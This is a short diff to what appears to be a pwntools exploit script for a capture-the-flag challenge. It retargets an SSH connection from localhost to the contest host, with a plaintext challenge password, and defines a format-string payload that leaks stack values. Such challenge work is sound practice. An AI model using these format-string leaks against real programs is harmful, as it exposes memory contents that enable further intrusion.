@@ -3,7 +3,7 @@ import re
 from pwn import *
 
 # Connect via SSH and initiate interactive "shell"
-p = ssh("isaac", "localhost", password="ctf2025!", port=30203, timeout=5, raw=True)
+p = ssh("isaac", "poison-in-the-wells-3.ctf.umanitobacssa.ca", password="ctf2025!", port=30203, timeout=5, raw=True)
 io = p.shell()
 
 format_string = b"%16$.08lx%15$.08lx%14$.08lx\n"
